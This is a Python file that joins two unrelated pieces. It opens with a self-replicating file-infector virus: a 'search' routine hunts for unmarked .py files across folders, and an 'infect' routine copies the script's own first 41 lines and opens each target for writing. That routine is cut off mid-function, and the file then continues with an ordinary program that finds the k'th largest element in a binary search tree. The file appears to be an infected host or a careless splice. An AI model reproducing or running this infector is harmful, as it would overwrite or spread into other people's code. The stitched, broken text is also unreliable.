#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# Python3 program to find k'th largest 
# element in BST 
  
class Node: 
  
    # Constructor to create a new node 
    def __init__(self, data): 
        self.key = data 
        self.left = None
        self.right = None
          
# A function to find k'th largest 
# element in a given tree. 
def kthLargestUtil(root, k, c):
      
    # Base cases, the second condition 
    # is important to avoid unnecessary
    # recursive calls 
    if root == None or c[0] >= k: 
        return
  
    # Follow reverse inorder traversal 
    # so that the largest element is 
    # visited first 
    kthLargestUtil(root.right, k, c)
  
    # Increment count of visited nodes 
    c[0] += 1
  
    # If c becomes k now, then this is 
    # the k'th largest 
    if c[0] == k:
        print("K'th largest element is", 
                               root.key) 
        return
  
    # Recur for left subtree 
    kthLargestUtil(root.left, k, c)
  
# Function to find k'th largest element 
def kthLargest(root, k):
      
    # Initialize count of nodes
    # visited as 0 
    c = [0]
  
    # Note that c is passed by reference 
    kthLargestUtil(root, k, c)
  
# A utility function to insert a new 
# node with given key in BST */
def insert(node, key): 
      
    # If the tree is empty, 
    # return a new node 
    if node == None:
        return Node(key) 
  
    # Otherwise, recur down the tree 
    if key < node.key: 
        node.left = insert(node.left, key) 
    elif key > node.key:
        node.right = insert(node.right, key) 
  
    # return the (unchanged) node pointer 
    return node
  
# Driver Code
if __name__ == '__main__':
      
    # Let us create following BST 
    #         50 
    #     /     \ 
    #     30     70 
    # / \ / \ 
    # 20 40 60 80 */
    root = None
    root = insert(root, 50)
    insert(root, 30)
    insert(root, 20)
    insert(root, 40)
    insert(root, 70)
    insert(root, 60)
    insert(root, 80)
  
    for k in range(1,8):
        kthLargest(root, k)
          
# This code is contributed by PranchalK
'''
Time Complexity: O(n) - In worst case the code traverse each and every node of the tree if the k given is equal to n (total number of nodes in the tree). Therefore overall time complexity is O(n)
Space Complexity: O(h) - Max recursion stack of height h at a given time.
'''